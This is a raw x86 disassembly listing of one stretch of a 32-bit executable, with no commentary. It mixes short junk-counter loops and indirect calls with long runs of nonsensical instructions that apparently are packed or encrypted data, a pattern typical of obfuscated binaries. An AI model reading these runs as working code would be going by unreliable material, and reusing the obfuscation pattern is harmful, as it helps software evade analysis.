  40e2b0:	cmp    DWORD PTR ds:0x42fd7d,0x7
  40e2b7:	jne    0x40e2ca
  40e2bd:	mov    ecx,DWORD PTR ds:0x42fd7d
  40e2c3:	inc    ecx
  40e2c4:	mov    DWORD PTR ds:0x42fd7d,ecx
  40e2ca:	cmp    DWORD PTR ds:0x42fd7d,0x15
  40e2d1:	jb     0x40e288
  40e2d7:	and    DWORD PTR ds:0x42fdee,0x0
  40e2e1:	jmp    0x40e2f3
  40e2e6:	mov    ecx,DWORD PTR ds:0x42fdee
  40e2ec:	inc    ecx
  40e2ed:	mov    DWORD PTR ds:0x42fdee,ecx
  40e2f3:	cmp    DWORD PTR ds:0x42fdee,0x1b
  40e2fa:	jae    0x40e34c
  40e300:	cmp    DWORD PTR ds:0x42fdee,0x9
  40e307:	jne    0x40e31b
  40e30d:	push   DWORD PTR [ebp-0x28]
  40e310:	push   0x42fd81
  40e315:	call   DWORD PTR ds:0x42e4f7
  40e31b:	cmp    DWORD PTR ds:0x42fdee,0x8
  40e322:	jne    0x40e335
  40e328:	mov    ecx,DWORD PTR ds:0x42fdee
  40e32e:	inc    ecx
  40e32f:	mov    DWORD PTR ds:0x42fdee,ecx
  40e335:	jmp    0x40e2e6
  40e33a:	mov    ebx,DWORD PTR ds:0x42e814
  40e340:	mov    ecx,DWORD PTR ds:0x42e81c
  40e346:	sub    ebx,ecx
  40e348:	imul   ebx,DWORD PTR [ebx+ecx*1]
  40e34c:	mov    DWORD PTR [ebp-0x10],eax
  40e34f:	sub    ecx,ebx
  40e351:	mov    eax,DWORD PTR [ebp+0x8]
  40e354:	and    ebx,ecx
  40e356:	mov    ecx,DWORD PTR [ebp-0x10]
  40e359:	sbb    DWORD PTR ds:0x42fdf2,ecx
  40e35f:	xor    eax,esi
  40e361:	add    eax,edi
  40e363:	mov    DWORD PTR [ecx],eax
  40e365:	jmp    0x40e4cf
  40e36a:	icebp  
  40e36b:	ja     0x40e334
  40e36d:	pop    ds
  40e36e:	inc    ecx
  40e36f:	scas   eax,DWORD PTR es:[edi]
  40e370:	icebp  
  40e371:	jno    0x40e314
  40e373:	push   edi
  40e374:	inc    eax
  40e375:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e376:	popa   
  40e377:	cwde   
  40e378:	fnsave [eax+0x7070a43b]
  40e37e:	ret    
  40e37f:	jg     0x40e3f1
  40e381:	jo     0x40e3ae
  40e383:	ins    DWORD PTR es:[edi],dx
  40e384:	lea    esi,[ebp+0x4e]
  40e387:	adc    DWORD PTR [edi],0x3e5e6c34
  40e38d:	jbe    0x40e3e0
  40e38f:	ffree  st(7)
  40e391:	daa    
  40e392:	dec    ecx
  40e393:	aas    
  40e394:	mov    al,0x7b
  40e396:	dec    eax
  40e397:	addr16 fsubr st,st(7)
  40e39a:	jmp    0xefd7:0xfce1c208
  40e3a1:	loop   0x40e410
  40e3a3:	shl    BYTE PTR [esi+eax*4-0xfaf20a8],cl
  40e3aa:	ficomp DWORD PTR [edi+0xeab2ba9]
  40e3b0:	mov    ecx,0x7c4fcf06
  40e3b5:	and    DWORD PTR [eax],ecx
  40e3b7:	je     0x40e41f
  40e3b9:	test   BYTE PTR [esi+0x770c37ae],cl
  40e3bf:	jl     0x40e3c6
  40e3c1:	jp     0x40e37c
  40e3c3:	jb     0x40e390
  40e3c5:	ins    BYTE PTR es:[edi],dx
  40e3c6:	dec    edi
  40e3c7:	into   
  40e3c8:	pop    ds
  40e3c9:	lock mov al,ds:0xcd69aa4a
  40e3cf:	enter  0xfd29,0xed
  40e3d3:	ss (bad) 
  40e3d7:	jge    0x40e3cb
  40e3d9:	xor    dh,BYTE PTR [edi]
  40e3db:	mov    DWORD PTR [ebp-0x604ed5e],ecx
  40e3e1:	sti    
  40e3e2:	cmp    BYTE PTR [edx],0xf2
  40e3e5:	or     BYTE PTR [esi+0x46a09ec2],cl
  40e3eb:	cwde   
  40e3ec:	cdq    
  40e3ed:	aaa    
  40e3ee:	out    0xea,eax
  40e3f0:	jmp    0x40e3c3
  40e3f2:	jle    0x40e3d1
  40e3f4:	in     eax,dx
  40e3f5:	dec    eax
  40e3f6:	pop    ebp
  40e3f7:	pop    edx
  40e3f8:	push   cs
  40e3f9:	out    dx,eax
  40e3fa:	rcr    DWORD PTR [ebx-0x4d],cl
  40e3fd:	shr    BYTE PTR [edx+ebp*2+0x2616e853],cl
  40e404:	ins    BYTE PTR es:[edi],dx
  40e405:	or     eax,DWORD PTR es:[edi+0xf]
  40e409:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e40a:	outs   dx,BYTE PTR ds:[esi]
  40e40b:	test   al,0x6e
  40e40d:	or     eax,0xd96c6534
  40e412:	and    eax,0x4b1b24c1
  40e417:	fcmovb st,st(1)
  40e419:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e41a:	and    DWORD PTR [esi-0x37],ebp
  40e41d:	fdiv   QWORD PTR [eax-0x74]
  40e420:	clc    
  40e421:	cmp    al,0x4e
  40e423:	jge    0x40e3e4
  40e425:	xlat   BYTE PTR ds:[ebx]
  40e426:	mov    ds:0x9472cb6b,al
  40e42b:	inc    esi
  40e42c:	add    BYTE PTR [ebx+edx*1-0x1a],al
  40e430:	test   BYTE PTR gs:[esi+0x7f],ah
  40e434:	scas   al,BYTE PTR es:[edi]
  40e435:	cdq    
  40e436:	in     eax,0xc6
  40e438:	and    edx,esi
  40e43a:	adc    al,0x6a
  40e43c:	mov    cs,WORD PTR [esi-0x1fa69a7f]
  40e442:	cmp    bl,al
  40e444:	jmp    0x40e406
  40e446:	inc    eax
  40e447:	inc    ebx
  40e448:	ret    0x618e
  40e44b:	data16 sbb al,BYTE PTR [edx+0x72d75194]
  40e452:	scas   eax,DWORD PTR es:[edi]
  40e453:	adc    cl,dl
  40e455:	cs ins DWORD PTR es:[edi],dx
  40e457:	leave  
  40e458:	mov    ds:0xffd4715b,eax
  40e45d:	adc    al,0xb9
  40e45f:	fild   DWORD PTR ds:0xc5191d62
  40e465:	or     ebx,DWORD PTR [edx]
  40e467:	jns    0x40e466
  40e469:	stc    
  40e46a:	fs push ecx
  40e46c:	(bad)  
  40e46d:	jmp    0xe57d65e0
  40e472:	dec    ebx
  40e473:	inc    eax
  40e474:	cmp    BYTE PTR [eax+0x6aa7b1cb],dh
  40e47a:	ss loop 0x40e407
  40e47d:	and    DWORD PTR [edx+esi*1],ebp
  40e480:	adc    eax,0xbcf63729
  40e485:	push   esp
  40e486:	dec    esi
  40e487:	and    al,0xc
  40e489:	pop    es
  40e48a:	jbe    0x40e47c
  40e48c:	mov    DWORD PTR [esi-0x55bc1df],edx
  40e492:	mov    DWORD PTR [edi+edx*8+0x37],esi
  40e496:	enter  0x6c22,0xb3
  40e49a:	cmp    al,0x1f
  40e49c:	mov    ch,0x1
  40e49e:	cdq    
  40e49f:	(bad)  [ecx+0x5e370f10]
  40e4a5:	jae    0x40e4a8
  40e4a7:	je     0x40e442
  40e4a9:	sti    
  40e4aa:	mov    ch,0x84
  40e4ac:	into   
  40e4ad:	mov    cl,0x6c
  40e4af:	jbe    0x40e4ec
  40e4b1:	ds inc ecx
  40e4b3:	add    al,0x70
  40e4b5:	cmpps  xmm7,XMMWORD PTR [ebx-0x1d],0x84
  40e4ba:	add    DWORD PTR [ecx+0x24],ebx
  40e4bd:	ins    BYTE PTR es:[edi],dx
  40e4be:	sub    DWORD PTR [edi],0xf37a6a28
  40e4c4:	mov    ch,0xc5
  40e4c6:	pop    ebx
  40e4c7:	ins    BYTE PTR es:[edi],dx
  40e4c8:	or     BYTE PTR [esi],bh
  40e4ca:	push   0xffffff99
  40e4cc:	aaa    
  40e4cd:	hlt    
  40e4ce:	jmp    0x9c85:0x31e845c7
  40e4d5:	clc    
  40e4d6:	and    ebx,0x399a
  40e4dc:	lea    eax,[ebp-0x18]
  40e4df:	mov    DWORD PTR [ebp-0x24],eax
  40e4e2:	jmp    0x40e64c
  40e4e7:	ror    DWORD PTR [eax+edi*4+0x61f15519],0x74
  40e4ef:	sbb    al,BYTE PTR ds:0xd204740f
  40e4f5:	ss inc ebx
  40e4f7:	mov    fs,WORD PTR [ebx+0x7fc37070]
  40e4fd:	jo     0x40e56f
  40e4ff:	int3   
  40e500:	ins    DWORD PTR es:[edi],dx
  40e501:	icebp  
  40e502:	data16 jmp 0x40e4c6
  40e505:	es jne 0x40e556
  40e508:	xor    eax,DWORD PTR [ebp+0x62]
  40e50b:	das    
  40e50c:	jb     0x40e4fc
  40e50e:	jmp    0x40e4ce
  40e510:	(bad)  
  40e511:	jmp    0x40e513
  40e513:	cdq    
  40e514:	or     al,0x9
  40e516:	push   0x34
  40e518:	js     0x40e581
  40e51a:	and    al,0xfe
  40e51c:	pusha  
  40e51d:	push   ecx
  40e51e:	loop   0x40e4c0
  40e520:	jecxz  0x40e4ef
  40e522:	adc    al,0x6c
  40e524:	jecxz  0x40e597
  40e526:	mov    bl,0xa1
  40e528:	xchg   edx,eax
  40e529:	outs   dx,DWORD PTR ds:[esi]
  40e52a:	out    dx,eax
  40e52b:	mov    ds:0x62f144a,al
  40e530:	test   al,0x71
  40e532:	or     DWORD PTR [eax],0x15
  40e535:	retf   
  40e536:	jmp    0xb059:0xc7085e33
  40e53d:	cmp    eax,DWORD PTR [edi]
  40e53f:	fistp  WORD PTR [ebp-0x5e617add]
  40e545:	pop    ebx
  40e546:	jns    0x40e548
  40e548:	and    ah,BYTE PTR [edi-0x7a]
  40e54b:	(bad)  
  40e54c:	pop    esp
  40e54d:	jns    0x40e52c
  40e54f:	mov    edi,DWORD PTR [ecx-0x67]
  40e552:	fwait
  40e553:	sub    BYTE PTR [ebp+0x46],al
  40e556:	lods   al,BYTE PTR ds:[esi]
  40e557:	mov    dl,0x84
  40e559:	add    esp,eax
  40e55b:	bound  eax,QWORD PTR [edx+eiz*4-0x36]
  40e55f:	ds and al,0x27
  40e562:	adc    DWORD PTR [edi+0x58],esi
  40e565:	scas   al,BYTE PTR es:[edi]
  40e566:	push   edx
  40e567:	push   ss
  40e568:	mov    bl,0xb8
  40e56a:	dec    eax
  40e56b:	jmp    0x40e593
  40e56d:	or     esp,edi
  40e56f:	cli    
  40e570:	jmp    0x47e476af
  40e575:	push   cs
  40e576:	dec    edi
  40e577:	pop    es
  40e578:	repz adc ah,BYTE PTR [eax-0x152022e0]
  40e57f:	lods   eax,DWORD PTR ds:[esi]
  40e580:	enter  0x9184,0xf3
  40e584:	sahf   
  40e585:	test   ch,dl
  40e587:	push   ebx
  40e588:	or     BYTE PTR [esi-0x72787217],0x2c
  40e58f:	jecxz  0x40e56e
  40e591:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e592:	push   esp
  40e593:	leave  
  40e594:	test   DWORD PTR [ecx+0x51f7f73d],ebx
  40e59a:	push   ss
  40e59b:	adc    eax,0xc84506c0
  40e5a0:	cmp    dl,BYTE PTR [ecx]
  40e5a2:	pop    eax
  40e5a3:	fisttp WORD PTR [ebx+0x70]
  40e5a6:	jbe    0x40e53c
  40e5a8:	xchg   ecx,eax
  40e5a9:	push   ebx
  40e5aa:	dec    edi
  40e5ab:	fist   WORD PTR [eax]
  40e5ad:	(bad)  
  40e5ae:	adc    BYTE PTR [edx],bh
  40e5b0:	loopne 0x40e5ea
  40e5b2:	and    DWORD PTR [ebx+0x736cb0c7],edi
  40e5b8:	std    
  40e5b9:	mov    ch,0x14
  40e5bb:	sub    al,0xd4
  40e5bd:	sbb    eax,DWORD PTR [ebx+0x64]
  40e5c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e5c1:	repnz xor BYTE PTR [esi],cl
  40e5c4:	call   0x51c5:0x31d8b24e
  40e5cb:	jo     0x40e5c5
  40e5cd:	xchg   edx,eax
  40e5ce:	cmp    dh,BYTE PTR [edi+0x3d]
  40e5d1:	and    DWORD PTR [eax+0x6d4873f7],eax
  40e5d7:	sbb    eax,0xfd77d425
  40e5dc:	loope  0x40e576
  40e5de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e5df:	int3   
  40e5e0:	mov    ebx,0x8284ffdc
  40e5e5:	push   cs
  40e5e6:	dec    eax
  40e5e7:	ret    
  40e5e8:	jecxz  0x40e57a
  40e5ea:	xchg   ecx,eax
  40e5eb:	into   
  40e5ec:	xor    ebx,ebx
  40e5ee:	out    dx,eax
  40e5ef:	mov    ss,WORD PTR [edx-0x3f]
  40e5f2:	push   ss
  40e5f3:	shr    DWORD PTR [ecx-0x35],0x5d
  40e5f7:	bound  edx,QWORD PTR [eax-0x41c19ebc]
  40e5fd:	cdq    
  40e5fe:	pop    ecx
  40e5ff:	aad    0x78
  40e601:	pop    ebx
  40e602:	sub    BYTE PTR [edi-0x3e],bl
  40e605:	cli    
  40e606:	mov    BYTE PTR [eax],ch
  40e608:	sti    
  40e609:	pop    ds
  40e60a:	adc    DWORD PTR [ebp-0x23555a9d],0x1f
  40e611:	arpl   WORD PTR ds:0x440fe4e,di
  40e617:	xchg   ecx,eax
  40e618:	fst    DWORD PTR [esi+0x54bb9729]
  40e61e:	(bad)  [edx*1+0x77a94ab]
  40e625:	mov    dl,0xf8
  40e627:	jmp    0x22df:0x96b3d82b
  40e62e:	push   esp
  40e62f:	addr16 add al,0x81
  40e632:	sub    al,0xea
  40e634:	out    0x28,eax
  40e636:	pusha  
  40e637:	imul   edi,DWORD PTR [edx-0x5d0529fd],0xab844ae1
  40e641:	pushf  
  40e642:	je     0x40e6c1
  40e644:	jae    0x40e6c0
  40e646:	jmp    0x8bb7:0x5b555899
  40e64d:	inc    ebp
  40e64e:	call   0xfe3b0bd4
  40e653:	inc    edx
  40e654:	add    BYTE PTR [eax],al
  40e656:	add    BYTE PTR [eax],al
  40e658:	add    cl,ch
  40e65a:	or     eax,0x8b000000
  40e65f:	sbb    eax,0x42fdfa
  40e664:	inc    ebx
  40e665:	mov    DWORD PTR ds:0x42fdfa,ebx
  40e66b:	cmp    DWORD PTR ds:0x42fdfa,0x1e
  40e672:	jae    0x40e697
  40e678:	cmp    DWORD PTR ds:0x42fdfa,0x24
  40e67f:	jne    0x40e690
  40e685:	push   0x1cae
  40e68a:	call   DWORD PTR ds:0x42e4fb
  40e690:	jmp    0x40e65e
  40e695:	neg    ebx
  40e697:	mov    ecx,DWORD PTR [ebp-0x24]
  40e69a:	add    ebx,0x74bf
  40e6a0:	xor    eax,esi
  40e6a2:	add    eax,edi
  40e6a4:	sub    DWORD PTR ds:0x42e19c,edx
  40e6aa:	mov    DWORD PTR [ecx],eax
  40e6ac:	mov    eax,ds:0x41b27c
  40e6b1:	adc    DWORD PTR ds:0x42fd81,ebx
  40e6b7:	mov    ebx,0x8e12febe
  40e6bc:	mov    DWORD PTR [ebp-0xc],ebx
  40e6bf:	adc    DWORD PTR ds:0x42fd59,0x7944
  40e6c9:	jmp    0x40e833
  40e6ce:	cmp    dl,bl
  40e6d0:	in     al,dx
  40e6d1:	fcomi  st,st(1)
  40e6d3:	jecxz  0x40e69e
  40e6d5:	icebp  
  40e6d6:	xor    al,0x3a
  40e6d8:	iret   
  40e6d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e6da:	xchg   BYTE PTR [eax-0x5daea4ef],dl
  40e6e0:	jo     0x40e752
  40e6e2:	ret    
  40e6e3:	jg     0x40e755
  40e6e5:	jo     0x40e70f
  40e6e7:	mov    al,ds:0x30383cae
  40e6ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e6ed:	xor    BYTE PTR [edi+eax*1-0x4b],bl
  40e6f1:	ret    0x9975
  40e6f4:	into   
  40e6f5:	cmp    DWORD PTR [eax+0x648b99f6],edi
  40e6fb:	xor    BYTE PTR [edx+edx*8],al
  40e6fe:	das    
  40e6ff:	daa    
  40e700:	push   ebp
  40e701:	xchg   edx,eax
  40e702:	cmp    al,0x58
  40e704:	cdq    
  40e705:	xor    BYTE PTR [edi],al
  40e707:	mul    BYTE PTR [esi+0x40]
  40e70a:	inc    eax
  40e70b:	lock mov al,0x78
  40e70e:	cwde   
  40e70f:	adc    BYTE PTR [edi+0x25d03dde],dl
  40e715:	lahf   
  40e716:	mov    al,0x57
  40e718:	add    BYTE PTR [esp+ebx*1+0x5b],0x4b
  40e71d:	pop    ebx
  40e71e:	mov    DWORD PTR [eax+0x1c52f65],eax
  40e724:	jge    0x40e780
  40e726:	xor    esi,esi
  40e728:	in     al,0x90
  40e72a:	xchg   ebx,eax
  40e72b:	push   0xffffff87
  40e72d:	fistp  DWORD PTR [eax-0x5d]
  40e730:	cmc    
  40e731:	(bad)  
  40e732:	fnstcw WORD PTR ds:0x6f363415
  40e738:	xchg   ch,cl
  40e73a:	aaa    
  40e73b:	jb     0x40e798
  40e73d:	sbb    ch,BYTE PTR [ecx-0x667214f4]
  40e743:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e744:	xlat   BYTE PTR ds:[ebx]
  40e745:	sbb    al,0xe0
  40e747:	xchg   ecx,eax
  40e748:	shl    BYTE PTR [ebp-0x138d8e33],0x31
  40e74f:	mov    WORD PTR [ebp+0xc],cs
  40e752:	lods   eax,DWORD PTR ds:[esi]
  40e753:	or     eax,0xbda2165a
  40e758:	jne    0x40e768
  40e75a:	out    0x95,eax
  40e75c:	retf   0x589b
  40e75f:	push   ebx
  40e760:	add    BYTE PTR [ebp-0x42],cl
  40e763:	mov    al,ds:0x8ae3aee2
  40e768:	test   al,0xeb
  40e76a:	sar    BYTE PTR [edx+ebp*4-0x2b],cl
  40e76e:	icebp  
  40e76f:	mov    ss,WORD PTR [ebx]
  40e771:	jae    0x40e77b
  40e773:	addr16 (bad) 
  40e775:	pop    eax
  40e776:	in     eax,0x51
  40e778:	ficomp WORD PTR [ebp-0x2b]
  40e77b:	fcmovbe st,st(5)
  40e77d:	jbe    0x40e737
  40e77f:	lea    ecx,[edi]
  40e781:	(bad)  
  40e782:	rcr    DWORD PTR [eax],cl
  40e784:	push   esi
  40e785:	xor    BYTE PTR [ebx+0x1d],ah
  40e788:	mov    bl,0xd6
  40e78a:	cmp    ecx,ebx
  40e78c:	push   0x49
  40e78e:	cvttps2pi mm0,QWORD PTR [edx+0x345f9047]
  40e795:	bnd je 0x40e758
  40e798:	les    ecx,FWORD PTR [ecx+0x32]
  40e79b:	repz xor DWORD PTR [esi+0xcda1b0e],esp
  40e7a2:	sbb    ebp,0x39
  40e7a5:	lahf   
  40e7a6:	pushf  
  40e7a7:	cld    
  40e7a8:	fs push 0xffffff8e
  40e7ab:	mov    eax,0x5c89afe
  40e7b0:	mov    dh,0x8
  40e7b2:	xor    DWORD PTR [edx],ecx
  40e7b4:	mov    ecx,0x911bb19a
  40e7b9:	cmp    al,0x6b
  40e7bb:	cmc    
  40e7bc:	cmp    cl,cl
  40e7be:	fsubp  st(5),st
  40e7c0:	icebp  
  40e7c1:	inc    esp
  40e7c2:	mov    ds:0xc6f0dc9a,al
  40e7c7:	or     cl,BYTE PTR ss:[edi]
  40e7ca:	cli    
  40e7cb:	aad    0x5b
  40e7cd:	add    al,0x29
  40e7cf:	rol    DWORD PTR [ecx-0x735f5ee],cl
  40e7d5:	push   ss
  40e7d6:	and    eax,0x312885ea
  40e7db:	xor    cl,BYTE PTR [ebp-0x7d]
  40e7de:	mov    dh,0xc1
  40e7e0:	mov    ebx,0x7d25ff18
  40e7e5:	cld    
  40e7e6:	and    bh,BYTE PTR [edi]
  40e7e8:	mov    bh,0x34
  40e7ea:	inc    ebx
  40e7eb:	mov    al,ds:0xd2d06745
  40e7f0:	mov    ebx,0x6ffa33b1
  40e7f5:	inc    ecx
  40e7f6:	or     ah,BYTE PTR [edi-0x55dca2a0]
  40e7fc:	popf   
  40e7fd:	add    al,BYTE PTR [ecx+0x3d0122a1]
  40e803:	cs out 0xdf,eax
  40e806:	xlat   BYTE PTR ds:[ebx]
  40e807:	loopne 0x40e7db
  40e809:	pusha  
  40e80a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e80c:	enter  0xa788,0x9c
  40e810:	jbe    0x40e7f3
  40e812:	push   ecx
  40e813:	jns    0x40e7c1
  40e815:	(bad)  
  40e816:	push   edx
  40e817:	cmp    eax,0xa22a1e24
  40e81c:	sbb    ch,BYTE PTR [ebx+0x4912137f]
  40e822:	(bad)  
  40e823:	mov    eax,ds:0xb2c4926c
  40e828:	mov    WORD PTR [esi-0x495fffac],es
  40e82e:	xor    DWORD PTR [eax+0xf],0x8bff5e
  40e835:	adc    DWORD PTR ds:0x42fd69,0x5067
  40e83f:	mov    cx,WORD PTR [ebp-0x4]
  40e843:	xor    DWORD PTR ds:0x42fd8d,0x42fdfe
  40e84d:	movzx  ecx,cx
  40e850:	add    ecx,DWORD PTR [eax]
  40e852:	neg    eax
  40e854:	mov    DWORD PTR [ebp-0x14],0xf89c853d
  40e85b:	sbb    eax,0x5a1e
  40e860:	mov    DWORD PTR [ebp-0x1c],ecx
  40e863:	mov    eax,DWORD PTR [ebp+0x8]
  40e866:	sbb    ecx,DWORD PTR ds:0x42fd61
  40e86c:	mov    ecx,DWORD PTR [ebp-0x8]
  40e86f:	xor    DWORD PTR ds:0x42e19c,0x42e76f
  40e879:	xor    eax,esi
  40e87b:	and    DWORD PTR ds:0x42e78b,0x57ad
  40e885:	add    eax,edi
  40e887:	cmp    DWORD PTR [ecx],eax
  40e889:	jne    0x40efe4
  40e88f:	and    DWORD PTR ds:0x42fd51,0x0
  40e899:	jmp    0x40e8ab
  40e89e:	mov    ecx,DWORD PTR ds:0x42fd51
  40e8a4:	inc    ecx
  40e8a5:	mov    DWORD PTR ds:0x42fd51,ecx
  40e8ab:	cmp    DWORD PTR ds:0x42fd51,0x11
  40e8b2:	jae    0x40e8fe
  40e8b8:	cmp    DWORD PTR ds:0x42fd51,0x8
  40e8bf:	jne    0x40e8d0
  40e8c5:	push   0x42e267
  40e8ca:	call   DWORD PTR ds:0x42e4ff
  40e8d0:	cmp    DWORD PTR ds:0x42fd51,0x7
  40e8d7:	jne    0x40e8ec
  40e8dd:	xor    ecx,ecx
  40e8df:	add    ecx,DWORD PTR ds:0x42fd51
  40e8e5:	inc    ecx
  40e8e6:	mov    DWORD PTR ds:0x42fd51,ecx
  40e8ec:	jmp    0x40e89e
  40e8f1:	movzx  ecx,BYTE PTR ds:0x42fe0a
  40e8f8:	adc    DWORD PTR ds:0x42e77f,ecx
  40e8fe:	mov    eax,DWORD PTR [ebp+0x8]
  40e901:	xor    DWORD PTR ds:0x42e777,0x70e3
  40e90b:	mov    ecx,DWORD PTR [ebp-0x1c]
  40e90e:	and    DWORD PTR ds:0x42e77b,0x42e76f
  40e918:	xor    eax,esi
  40e91a:	not    DWORD PTR ds:0x42fd81
  40e920:	add    eax,edi
  40e922:	mov    DWORD PTR ds:0x42fd8d,0x37d2
  40e92c:	cmp    DWORD PTR [ecx],eax
  40e92e:	mov    DWORD PTR ds:0x42e78b,0x263d
  40e938:	jmp    0x40eaa2
  40e93d:	(bad)  
  40e93e:	(bad)  
  40e93f:	fistp  DWORD PTR [ebx+0x65445961]
  40e945:	shl    BYTE PTR [edi-0x39],0x63
  40e949:	jbe    0x40e913
  40e94b:	or     eax,0x70a0248c
  40e950:	jo     0x40e915
  40e952:	jg     0x40e9c4
  40e954:	jo     0x40e92b
  40e956:	fwait
  40e957:	inc    ecx
  40e958:	mov    DWORD PTR [edx-0x603bd1dd],eax
  40e95e:	mov    ds:0x71b84a32,eax
  40e963:	cdq    
  40e964:	pop    edi
  40e966:	mov    ebp,DWORD PTR [edx-0x2f]
  40e969:	mov    dl,0x57
  40e96b:	jmp    0x2a57a9ab
  40e970:	sbb    ebx,esp
  40e972:	cmp    ecx,ebp
  40e974:	dec    ebp
  40e975:	popa   
  40e976:	ffreep st(5)
  40e978:	lods   eax,DWORD PTR ds:[esi]
  40e979:	xor    al,0x3f
  40e97b:	push   0x64
  40e97d:	rcr    DWORD PTR [edi-0x330f9074],cl
  40e983:	adc    DWORD PTR [ebx+0x66180cc9],0x66de37ad
  40e98d:	mov    bl,0x96
  40e98f:	jge    0x40e9c0
  40e991:	mov    ebx,?
  40e993:	lea    ebp,[esi-0x1e]
  40e996:	ret    0x3991
  40e999:	add    ah,bh
  40e99b:	dec    eax
  40e99c:	sub    dh,BYTE PTR [eax]
  40e99e:	fisub  WORD PTR [eax+0x40]
  40e9a1:	outs   dx,DWORD PTR ds:[esi]
  40e9a2:	xor    al,BYTE PTR [ebp+eiz*4+0x53e7103c]
  40e9a9:	sbb    eax,0xbed6f998
  40e9ae:	sub    ah,BYTE PTR [esi]
  40e9b0:	jae    0x40ea08
  40e9b2:	sub    DWORD PTR [edi],ebx
  40e9b4:	fmul   DWORD PTR [eax]
  40e9b6:	jge    0x40e938
  40e9b8:	mov    dh,0x1a
  40e9ba:	mov    ch,0x6e
  40e9bc:	cmp    al,0x0
  40e9be:	pusha  
  40e9bf:	(bad)  
  40e9c0:	sub    eax,0x394c5d69
  40e9c5:	jmp    0x8ce40db1
  40e9ca:	xor    al,0x63
  40e9cc:	jno    0x40ea3c
  40e9ce:	sub    eax,0xfe2e5c35
  40e9d3:	mov    edx,0xfb1a6206
  40e9d8:	push   eax
  40e9d9:	mov    edi,0x1e36c352
  40e9de:	rol    ebx,cl
  40e9e0:	hlt    
  40e9e1:	repz cs sub eax,0x99edcb41
  40e9e8:	pop    ebx
  40e9e9:	inc    esp
  40e9ea:	mov    edx,0xde400317
  40e9ef:	fstp   DWORD PTR [ebx+0x3cd5841d]
  40e9f5:	ds or  ebx,DWORD PTR gs:[ebx]
  40e9f9:	sub    cl,bl
  40e9fb:	push   ebp
  40e9fc:	pop    eax
  40e9fd:	sub    DWORD PTR [edi-0x70],esi
  40ea00:	push   ds
  40ea01:	cmp    DWORD PTR gs:[edi+0x15],0xffffff9e
  40ea06:	jo     0x40e9f2
  40ea08:	push   ss
  40ea09:	and    al,0xb6
  40ea0b:	add    ch,BYTE PTR [edx-0x558ae8e5]
  40ea11:	and    eax,0xb1267519
  40ea16:	jl     0x40e9a5
  40ea18:	xor    DWORD PTR [esi-0x735efb1d],ebp
  40ea1e:	xor    al,0xef
  40ea20:	call   0x69fb:0x2614d0e2
  40ea27:	pop    esp
  40ea28:	sbb    ebp,DWORD PTR [edx]
  40ea2a:	enter  0x4b37,0xb6
  40ea2e:	or     bl,BYTE PTR [eax-0xf749922]
  40ea34:	sti    
  40ea35:	test   BYTE PTR [ebp-0x7e],bl
  40ea38:	push   edi
  40ea39:	inc    ecx
  40ea3a:	inc    esi
  40ea3b:	ja     0x40ea21
  40ea3d:	dec    esi
  40ea3e:	mov    WORD PTR [eax-0x44396281],ds
  40ea44:	js     0x40ea6b
  40ea46:	cmc    
  40ea47:	aas    
  40ea48:	mov    ?,WORD PTR [ebx-0x3]
  40ea4b:	push   edi
  40ea4c:	add    DWORD PTR [eax],ebx
  40ea4e:	and    BYTE PTR [esi+0x21],bl
  40ea51:	dec    ebx
  40ea52:	std    
  40ea53:	test   al,0xef
  40ea55:	cmp    eax,0x9f0de34c
  40ea5a:	push   ebx
  40ea5b:	out    dx,eax
  40ea5c:	inc    edi
  40ea5d:	mov    ebx,0x5bd2b1a6
  40ea62:	fidiv  DWORD PTR [edi-0x2d]
  40ea65:	pusha  
  40ea66:	scas   al,BYTE PTR es:[edi]
  40ea67:	call   0xd063:0xe718a81d
  40ea6e:	int    0x7c
  40ea70:	jmp    0xddf2:0xbaa6ce25
  40ea77:	push   cs
  40ea78:	sahf   
  40ea79:	jle    0x40ea4a
  40ea7b:	pusha  
  40ea7c:	arpl   WORD PTR [ecx+ebx*8],bp
  40ea7f:	shl    BYTE PTR [ecx-0x5b],1
  40ea82:	or     bh,BYTE PTR cs:[ebx+ebx*2]
  40ea86:	xchg   esp,eax
  40ea87:	dec    edi
  40ea88:	imul   DWORD PTR [esi]
  40ea8a:	in     eax,0x8e
  40ea8c:	jae    0x40eaa3
  40ea8e:	fisttp DWORD PTR [ecx-0x4a653ae2]
  40ea94:	dec    ecx
  40ea95:	in     eax,dx
  40ea96:	test   DWORD PTR [eax-0x3a8c42f3],edi
  40ea9c:	pop    DWORD PTR [eax+esi*2-0x19]
  40eaa0:	or     ecx,edi
  40eaa2:	jne    0x40eb4e
  40eaa8:	add    ecx,edx
  40eaaa:	mov    eax,DWORD PTR [ebp+0x8]
  40eaad:	sbb    ecx,0x443c
  40eab3:	mov    ecx,DWORD PTR [ebp-0x10]
  40eab6:	adc    edx,DWORD PTR ds:0x42fd65
  40eabc:	xor    eax,esi
  40eabe:	add    eax,edi
  40eac0:	mov    DWORD PTR [ecx],eax
  40eac2:	sbb    ecx,0x77dc
  40eac8:	mov    eax,DWORD PTR [ebp-0x10]
  40eacb:	adc    ecx,0x4d7b
  40ead1:	mov    ecx,DWORD PTR [ebp-0x14]
  40ead4:	mov    DWORD PTR ds:0x42e1a8,0x11
  40eade:	cmp    DWORD PTR ds:0x42e1a8,0x0
  40eae5:	je     0x40eb43
  40eaeb:	cmp    DWORD PTR ds:0x42e1a8,0x2
  40eaf2:	jne    0x40eb15
  40eaf8:	push   0x42e1b0
  40eafd:	push   0x42e1ef
  40eb02:	push   0x1c20
  40eb07:	push   DWORD PTR [ebp-0x10]
  40eb0a:	push   0x848e
  40eb0f:	call   DWORD PTR ds:0x42e38f
  40eb15:	cmp    DWORD PTR ds:0x42e1a8,0x3
  40eb1c:	jne    0x40eb31
  40eb22:	xor    edx,edx
  40eb24:	or     edx,DWORD PTR ds:0x42e1a8
  40eb2a:	dec    edx
  40eb2b:	mov    DWORD PTR ds:0x42e1a8,edx
  40eb31:	mov    edx,DWORD PTR ds:0x42e1a8
  40eb37:	dec    edx
